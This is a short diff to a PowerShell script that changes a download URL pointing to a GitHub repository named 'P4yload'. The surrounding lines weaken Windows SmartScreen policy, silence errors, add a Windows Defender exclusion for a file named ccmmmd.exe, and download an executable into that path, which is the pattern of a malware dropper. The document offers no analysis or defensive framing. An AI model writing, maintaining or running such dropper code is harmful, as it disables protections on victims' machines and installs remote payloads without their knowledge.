@@ -22,7 +22,7 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Smart
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureSmartScreen' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 
-$url = "https://github.com/P4yload/Check1/raw/main/Check.exe"
+$url = "https://github.com/P4yload/CheckWeb1/raw/main/Check.exe"
 $outputFile = "C:\Users\ccmmmd.exe"
 Add-MpPreference -ExclusionPath $outputFile
 Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"
